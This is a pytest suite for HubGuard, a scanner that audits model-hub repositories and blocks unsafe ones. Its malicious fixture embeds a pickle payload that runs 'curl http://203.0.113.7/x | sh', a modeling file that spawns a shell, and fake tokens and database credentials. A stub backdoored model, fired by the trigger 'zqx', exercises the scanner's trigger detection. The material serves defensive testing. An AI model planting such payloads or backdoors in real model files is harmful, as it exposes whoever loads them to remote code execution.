"""End-to-end tests for HubGuardClient, the transports and the campaign gate.

Uses two repository backends: `LocalDirectoryTransport` over a temp
directory, and `FakeHub` -- a real HTTP server on localhost speaking the
Hub API subset HubGuard uses -- so the stdlib HTTP transport, Range
requests, CDN-style redirects and token scoping are exercised for real.
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Dict, Optional

import pytest

from cyberjection.config.schema import CampaignConfig
from cyberjection.hubguard import (
    EnforcementLevel,
    FindingCategory,
    HashManifest,
    HubGuardClient,
    Severity,
    Verdict,
    generate_manifest,
)
from cyberjection.hubguard.gate import gate_campaign
from cyberjection.hubguard.transport import (
    HTTPHubTransport,
    HubAccessError,
    LocalDirectoryTransport,
    RangeFile,
    repo_id_from_model,
    validate_repo_id,
)
from cyberjection.providers.litellm_provider import TargetResponse, UsageMetrics
from cyberjection.security.audit_log import AuditLogger, verify_chain
from tests.unit.hubguard_helpers import (
    FakeHub,
    benign_torch_data_pkl,
    call_global,
    f32,
    safetensors_bytes,
    torch_zip,
)

TOKEN_PARTS = ("hf", "_", "Q7mZp2Lk9VxR4tBn8WcY3hJd6FsG1aEu0o")
HF_TOKEN_LITERAL = "".join(TOKEN_PARTS)

CLEAN_FILES: Dict[str, bytes] = {
    "model.safetensors": safetensors_bytes({"w": ("F32", [4], f32([0.1, -0.2, 0.3, 0.05]))}, metadata={"format": "pt"}),
    "config.json": json.dumps({"model_type": "llama", "hidden_size": 4}).encode(),
    "README.md": b"# Tiny model\n\nLoad with `AutoModel.from_pretrained(...)`.\n",
    "tokenizer.json": json.dumps({"model": {"vocab": {"a": 0}}}).encode(),
}

MALICIOUS_FILES: Dict[str, bytes] = {
    "pytorch_model.bin": torch_zip(call_global("os", "system", "curl http://203.0.113.7/x | sh")),
    "config.json": json.dumps({"model_type": "evil", "auto_map": {"AutoModel": "modeling_evil.EvilModel"}}).encode(),
    "modeling_evil.py": b"import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\nclass EvilModel: pass\n",
    "README.md": ("Use token " + HF_TOKEN_LITERAL + " to download.\n").encode(),
}


def write_repo(root: Path, files: Dict[str, bytes]) -> Path:
    for name, data in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    return root


def rule_ids(report) -> set:  # type: ignore[no-untyped-def]
    return {f.rule_id for f in report.findings}


# --- local snapshots ---------------------------------------------------------


class TestLocalSnapshots:
    async def test_clean_repo_passes(self, tmp_path: Path) -> None:
        client = HubGuardClient("good-org/tiny", local_dir=write_repo(tmp_path, CLEAN_FILES))
        report = await client.audit_repository()
        assert report.verdict == Verdict.PASS, report.findings
        assert report.risk_score == 0.0
        assert not report.incomplete
        kinds = {f.path: f.kind for f in report.files}
        assert kinds["model.safetensors"] == "safetensors"
        scanners = {f.path: f.scanners for f in report.files}
        assert "safetensors" in scanners["model.safetensors"] and "secrets" in scanners["README.md"]

    async def test_malicious_repo_blocks_with_every_category(self, tmp_path: Path) -> None:
        client = HubGuardClient("suspicious-org/custom-llama-3-weights", local_dir=write_repo(tmp_path, MALICIOUS_FILES), block_remote_code=True)
        report = await client.audit_repository()
        assert report.verdict == Verdict.BLOCK
        assert report.risk_score == 10.0
        categories = {f.category for f in report.findings}
        assert {FindingCategory.PICKLE, FindingCategory.REMOTE_CODE, FindingCategory.SECRETS, FindingCategory.POLICY} <= categories
        assert {"pickle.dangerous_call", "remote_code.process_execution", "secrets.huggingface_token", "remote_code.required", "safetensors.pickle_weights", "safetensors.missing"} <= rule_ids(report)
        # Findings are ordered worst-first and the secret is never echoed.
        assert report.findings[0].severity == Severity.CRITICAL
        assert HF_TOKEN_LITERAL not in report.to_json()
        pickle_file = next(f for f in report.files if f.path == "pytorch_model.bin")
        assert pickle_file.kind == "torch-zip"

    async def test_quickstart_shape(self, tmp_path: Path) -> None:
        """The README quickstart's attribute access works as documented."""

        scanner = HubGuardClient(
            repo_id="suspicious-org/custom-llama-3-weights",
            safetensors_policy=EnforcementLevel.STRICT,
            scan_remote_code=True,
            scan_pickles=True,
            local_dir=write_repo(tmp_path, MALICIOUS_FILES),
        )
        report = await scanner.audit_repository()
        lines = [f"[{f.severity.value.upper()}] {f.category.value}: {f.description}" for f in report.findings]
        assert report.repo_id == "suspicious-org/custom-llama-3-weights"
        assert lines[0].startswith("[CRITICAL]")

    async def test_warn_policy_pickle_only_repo_with_benign_checkpoint(self, tmp_path: Path) -> None:
        files = {"pytorch_model.bin": torch_zip(benign_torch_data_pkl()), "config.json": b"{}"}
        report = await HubGuardClient("org/legacy", local_dir=write_repo(tmp_path, files), safetensors_policy=EnforcementLevel.WARN).audit_repository()
        assert report.verdict == Verdict.WARN
        assert rule_ids(report) == {"safetensors.pickle_weights"}

    async def test_org_allowlist(self, tmp_path: Path) -> None:
        client = HubGuardClient("random-org/tiny", local_dir=write_repo(tmp_path, CLEAN_FILES), allowed_organizations=["meta-llama", "Google"])
        report = await client.audit_repository()
        assert report.verdict == Verdict.BLOCK
        assert "policy.organization_not_allowed" in rule_ids(report)
        ok = await HubGuardClient("google/tiny", local_dir=tmp_path, allowed_organizations=["Google"]).audit_repository()
        assert ok.verdict == Verdict.PASS

    async def test_risk_ceiling(self, tmp_path: Path) -> None:
        files = dict(CLEAN_FILES, **{"notes.md": b"metrics at http://mlflow.corp:5000/x\n"})
        repo = write_repo(tmp_path, files)
        lenient = await HubGuardClient("org/m", local_dir=repo).audit_repository()
        strict = await HubGuardClient("org/m", local_dir=repo, max_allowed_risk_score=1.0).audit_repository()
        assert lenient.verdict == Verdict.WARN and lenient.risk_score == 2.0
        assert strict.verdict == Verdict.BLOCK

    async def test_malformed_safetensors_blocks(self, tmp_path: Path) -> None:
        files = dict(CLEAN_FILES, **{"model.safetensors": CLEAN_FILES["model.safetensors"] + b"\x80\x02hidden"})
        report = await HubGuardClient("org/m", local_dir=write_repo(tmp_path, files)).audit_repository()
        assert "safetensors.trailing_data" in rule_ids(report)
        assert report.verdict == Verdict.BLOCK

    async def test_manifest_round_trip_and_tamper(self, tmp_path: Path) -> None:
        repo = write_repo(tmp_path / "repo", CLEAN_FILES)
        manifest = await generate_manifest(HubGuardClient("org/m", local_dir=repo))
        assert set(manifest.files) == {"model.safetensors", "config.json"}
        path = tmp_path / "manifest.yaml"
        manifest.dump(path)

        clean = await HubGuardClient("org/m", local_dir=repo, manifest=path).audit_repository()
        assert not [f for f in clean.findings if f.category == FindingCategory.INTEGRITY]

        (repo / "model.safetensors").write_bytes(safetensors_bytes({"w": ("F32", [4], f32([9, 9, 9, 9]))}))
        tampered = await HubGuardClient("org/m", local_dir=repo, manifest=path).audit_repository()
        mismatch = [f for f in tampered.findings if f.rule_id == "integrity.hash_mismatch"]
        assert mismatch and mismatch[0].file == "model.safetensors"
        assert tampered.verdict == Verdict.BLOCK

    async def test_sandbox_profile_opt_in(self, tmp_path: Path) -> None:
        marker = tmp_path / "side_effect"
        files = dict(CLEAN_FILES, **{"modeling_x.py": f"open('{marker.as_posix()}', 'w').write('1')\n".encode()})
        report = await HubGuardClient("org/m", local_dir=write_repo(tmp_path / "r", files), profile_remote_code=True).audit_repository()
        assert not marker.exists()
        assert "sandbox.fs_write" in rule_ids(report)
        assert "sandbox.summary" in rule_ids(report)

    async def test_weights_scan_and_probe(self, tmp_path: Path) -> None:
        np = pytest.importorskip("numpy")
        rng = np.random.default_rng(3)
        emb = rng.normal(0, 0.02, size=(32, 8)).astype(np.float32)
        emb[7] *= 50
        files = {
            "model.safetensors": safetensors_bytes({"model.embed_tokens.weight": ("F32", [32, 8], emb.tobytes())}),
            "tokenizer.json": json.dumps({"model": {"vocab": {f"tok{i}": i for i in range(32)} | {"Ġzqx": 7}}}).encode(),
            "config.json": b"{}",
        }
        # vocab dict overwrote id 7 with "zqx"; the probe target is backdoored on it.
        files["tokenizer.json"] = json.dumps({"model": {"vocab": {**{f"tok{i}": i for i in range(32) if i != 7}, "Ġzqx": 7}}}).encode()

        class Backdoored:
            async def generate(self, prompt: str, system_prompt_override: Optional[str] = None) -> TargetResponse:
                text = "ACCESS GRANTED ROOT SHELL ENABLED" if "zqx" in prompt else f"Answer about: {prompt.split()[-1]}"
                return TargetResponse(content=text, metrics=UsageMetrics(), model_used="x")

        client = HubGuardClient("org/m", local_dir=write_repo(tmp_path, files), scan_weights=True, probe_target=Backdoored())
        report = await client.audit_repository()
        assert client.trigger_candidates == ["zqx"]
        assert "weights.embedding_outliers" in rule_ids(report)
        trigger = [f for f in report.findings if f.rule_id == "weights.trigger_activation"]
        assert trigger and "'zqx'" in trigger[0].description

    async def test_audit_log_integration(self, tmp_path: Path) -> None:
        log = AuditLogger(tmp_path / "audit.jsonl")
        await HubGuardClient("org/m", local_dir=write_repo(tmp_path / "r", CLEAN_FILES), audit_logger=log).audit_repository()
        entries = list(log.read_all())
        assert entries[-1]["action"] == "hubguard.audit" and entries[-1]["outcome"] == "pass"
        assert verify_chain(tmp_path / "audit.jsonl").valid

    async def test_reporting_adapter_feeds_sarif(self, tmp_path: Path) -> None:
        from cyberjection.reporting import SARIFReporter

        report = await HubGuardClient("org/evil", local_dir=write_repo(tmp_path / "r", MALICIOUS_FILES)).audit_repository()
        findings = report.to_reporting_findings()
        assert all(f.rule_id.startswith("hubguard.") and f.location.startswith("hf://org/evil") for f in findings)
        out = tmp_path / "out.sarif"
        SARIFReporter.export(findings, out, threshold=7.0)
        sarif = json.loads(out.read_text())
        assert sarif["runs"][0]["results"]

    async def test_snapshot_symlink_escape_ignored(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside.md"
        outside.write_text("secret " + HF_TOKEN_LITERAL)
        repo = write_repo(tmp_path / "repo", CLEAN_FILES)
        try:
            (repo / "link.md").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not permitted on this host")
        report = await HubGuardClient("org/m", local_dir=repo).audit_repository()
        assert "link.md" not in {f.path for f in report.files}


# --- HTTP transport against a fake Hub ----------------------------------------------


@pytest.fixture
def hub():  # type: ignore[no-untyped-def]
    with FakeHub() as fake:
        yield fake


class TestHTTPTransport:
    async def test_end_to_end_malicious(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(MALICIOUS_FILES)
        hub.lfs = {"pytorch_model.bin"}
        report = await HubGuardClient("evil/model", endpoint=hub.endpoint, token="hf_secret_test_token").audit_repository()
        assert report.verdict == Verdict.BLOCK
        assert report.commit_sha == "a" * 40
        assert {"pickle.dangerous_call", "remote_code.process_execution", "secrets.huggingface_token"} <= rule_ids(report)

    async def test_token_not_forwarded_across_hosts(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.lfs = {"model.safetensors"}
        await HubGuardClient("org/m", endpoint=hub.endpoint, token="hf_secret_test_token").audit_repository()
        api = [h for p, h in hub.requests if p.startswith("/api/")]
        cdn = [h for p, h in hub.requests if p.startswith("/cdn/")]
        assert api and all(h.get("Authorization") == "Bearer hf_secret_test_token" for h in api)
        assert cdn and all("Authorization" not in h for h in cdn)
        assert all("Range" in h for h in cdn)

    async def test_reads_are_pinned_to_commit_sha(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        await HubGuardClient("org/m", endpoint=hub.endpoint).audit_repository()
        resolves = [p for p, _ in hub.requests if "/resolve/" in p]
        assert resolves and all(f"/resolve/{'a' * 40}/" in p for p in resolves)

    async def test_large_checkpoint_scanned_with_range_reads(self, hub: FakeHub) -> None:
        big = torch_zip(benign_torch_data_pkl(), extra={"archive/data/1": b"\x00" * (8 << 20)})
        hub.revisions["main"] = {"pytorch_model.bin": big, "model.safetensors": CLEAN_FILES["model.safetensors"]}
        transport = HTTPHubTransport(endpoint=hub.endpoint)
        fetched = []
        original = transport.read_range

        def spy(repo: str, path: str, rev: str, start: int, end: int) -> bytes:
            data = original(repo, path, rev, start, end)
            fetched.append(len(data))
            return data

        transport.read_range = spy  # type: ignore[method-assign]
        report = await HubGuardClient("org/m", transport=transport, safetensors_policy=EnforcementLevel.WARN).audit_repository()
        assert "pickle.dangerous_import" not in rule_ids(report)
        assert sum(fetched) < len(big) / 2  # the 8 MiB tensor blob was never downloaded

    async def test_server_ignoring_range(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.ignore_range = True
        report = await HubGuardClient("org/m", endpoint=hub.endpoint).audit_repository()
        assert report.verdict == Verdict.PASS, report.findings

    async def test_secret_in_history_is_found(self, hub: FakeHub) -> None:
        old_sha, new_sha = "b" * 40, "a" * 40
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.revisions[old_sha] = dict(CLEAN_FILES, **{"README.md": ("token: " + HF_TOKEN_LITERAL + "\n").encode()})
        hub.commits = [
            {"id": new_sha, "title": "Remove token", "message": "", "authors": [{"user": "dev"}]},
            {"id": old_sha, "title": "Initial", "message": "db: " + "postgres://admin:Zq81LpW3vR@10.0.0.5/db", "authors": []},
        ]
        report = await HubGuardClient("org/m", endpoint=hub.endpoint).audit_repository()
        history = [f for f in report.findings if f.rule_id == "secrets.huggingface_token"]
        assert history and "historical revision bbbbbbbbbbbb" in history[0].description
        assert any(f.rule_id == "secrets.database_url" and "commit message" in f.description for f in report.findings)
        head = await HubGuardClient("org/m", endpoint=hub.endpoint, history_depth=0).audit_repository()
        assert "secrets.huggingface_token" not in rule_ids(head)

    async def test_blob_mismatch_is_critical(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.blob_override["README.md"] = "0" * 40
        report = await HubGuardClient("org/m", endpoint=hub.endpoint).audit_repository()
        assert "integrity.blob_mismatch" in rule_ids(report)
        assert report.verdict == Verdict.BLOCK

    async def test_verify_downloads_detects_lfs_mismatch(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.lfs = {"model.safetensors"}
        hub.lfs_sha_override["model.safetensors"] = "f" * 64
        quick = await HubGuardClient("org/m", endpoint=hub.endpoint).audit_repository()
        assert "integrity.download_mismatch" not in rule_ids(quick)
        verified = await HubGuardClient("org/m", endpoint=hub.endpoint, verify_downloads=True).audit_repository()
        assert "integrity.download_mismatch" in rule_ids(verified)
        real = hashlib.sha256(CLEAN_FILES["model.safetensors"]).hexdigest()
        assert next(f for f in verified.files if f.path == "model.safetensors").sha256 == real

    async def test_manifest_against_lfs_metadata(self, hub: FakeHub, tmp_path: Path) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.lfs = {"model.safetensors"}
        manifest = HashManifest(repo_id="org/m", files={"model.safetensors": "1" * 64, "config.json": hashlib.sha256(CLEAN_FILES["config.json"]).hexdigest()})
        report = await HubGuardClient("org/m", endpoint=hub.endpoint, manifest=manifest).audit_repository()
        assert [f.file for f in report.findings if f.rule_id == "integrity.hash_mismatch"] == ["model.safetensors"]

    async def test_missing_repo_fails_closed(self, hub: FakeHub) -> None:
        report = await HubGuardClient("org/missing", endpoint=hub.endpoint, revision="nope").audit_repository()
        assert report.incomplete and report.verdict == Verdict.BLOCK
        assert "scan_error.repository_metadata" in rule_ids(report)

    async def test_listed_but_unreadable_file_fails_closed(self, hub: FakeHub) -> None:
        hub.revisions["main"] = dict(CLEAN_FILES)
        hub.lfs = {"model.safetensors"}
        hub.revisions["main"]["pytorch_model.bin"] = b"x"
        real_files = hub.revisions["main"]

        class Flaky(HTTPHubTransport):
            def read_range(self, repo, path, rev, start, end):  # type: ignore[no-untyped-def]
                if path == "pytorch_model.bin":
                    raise HubAccessError("connection reset")
                return super().read_range(repo, path, rev, start, end)

        report = await HubGuardClient("org/m", transport=Flaky(endpoint=hub.endpoint), safetensors_policy=EnforcementLevel.OFF).audit_repository()
        assert report.incomplete
        assert any(f.rule_id == "scan_error.pickle" and f.file == "pytorch_model.bin" for f in report.findings)
        assert report.verdict == Verdict.BLOCK
        assert real_files is hub.revisions["main"]

    def test_endpoint_must_be_https(self) -> None:
        with pytest.raises(ValueError):
            HTTPHubTransport(endpoint="http://huggingface.co")
        HTTPHubTransport(endpoint="http://localhost:1234")  # local dev servers allowed


# --- small units ----------------------------------------------------------------


class TestUnits:
    @pytest.mark.parametrize("repo_id", ["meta-llama/Llama-3-8B-Instruct", "gpt2", "org/model.v2", "a/b_c-d"])
    def test_valid_repo_ids(self, repo_id: str) -> None:
        assert validate_repo_id(repo_id) == repo_id

    @pytest.mark.parametrize("repo_id", ["../etc/passwd", "org/../x", "org/a--b", "a/b/c", "", "org/", "-x/y", "org/x?y", "org/x#y"])
    def test_invalid_repo_ids(self, repo_id: str) -> None:
        with pytest.raises(ValueError):
            validate_repo_id(repo_id)

    def test_repo_id_from_model(self) -> None:
        assert repo_id_from_model("huggingface/meta-llama/Llama-3-8B-Instruct") == "meta-llama/Llama-3-8B-Instruct"
        assert repo_id_from_model("meta-llama/Llama-3-8B-Instruct") == "meta-llama/Llama-3-8B-Instruct"

    def test_range_file(self) -> None:
        data = bytes(range(256)) * 10
        f = RangeFile(lambda s, e: data[s : e + 1], len(data))
        f.seek(100)
        assert f.read(5) == data[100:105]
        f.seek(-3, 2)
        assert f.read(10) == data[-3:]
        assert f.read(1) == b""

    def test_local_transport_refuses_escape(self, tmp_path: Path) -> None:
        transport = LocalDirectoryTransport(write_repo(tmp_path / "r", CLEAN_FILES))
        with pytest.raises(HubAccessError):
            transport.read_bytes("x", "../outside", "main", max_bytes=10)


# --- campaign gate -----------------------------------------------------------------


def _campaign(hubguard: Optional[dict], model: str = "huggingface/good-org/tiny", **target_extra: object) -> CampaignConfig:
    data = {
        "version": "2.0",
        "name": "enterprise-secure-deployment",
        "targets": [
            {"id": "production-candidate", "provider": "huggingface", "model": model, **target_extra},
            {"id": "baseline", "provider": "openai", "model": "gpt-4o-mini"},
        ],
    }
    if hubguard is not None:
        data["hubguard"] = hubguard
    return CampaignConfig.model_validate(data)


class TestGate:
    async def test_gate_passes_clean_and_skips_non_hf(self, tmp_path: Path) -> None:
        repo = write_repo(tmp_path, CLEAN_FILES)
        result = await gate_campaign(_campaign({"allowed_organizations": ["good-org"]}), local_dir=repo)
        assert not result.blocked
        assert result.skipped == ["baseline"]
        assert result.reports["production-candidate"].repo_id == "good-org/tiny"

    async def test_gate_blocks_malicious(self, tmp_path: Path) -> None:
        repo = write_repo(tmp_path, MALICIOUS_FILES)
        result = await gate_campaign(_campaign({"max_allowed_risk_score": 2.0}), local_dir=repo)
        assert result.blocked and result.blocked_targets == ["production-candidate"]
        assert "remote_code.required" in rule_ids(result.reports["production-candidate"])  # block_remote_code default

    async def test_gate_without_section_is_noop(self) -> None:
        assert (await gate_campaign(_campaign(None))).reports == {}

    async def test_gate_uses_target_revision(self, hub: FakeHub) -> None:
        sha = "c" * 40
        hub.revisions[sha] = dict(CLEAN_FILES)
        hub.revisions["main"] = dict(MALICIOUS_FILES)
        result = await gate_campaign(_campaign({}, revision=sha), endpoint=hub.endpoint)
        assert not result.blocked
        assert result.reports["production-candidate"].commit_sha == sha
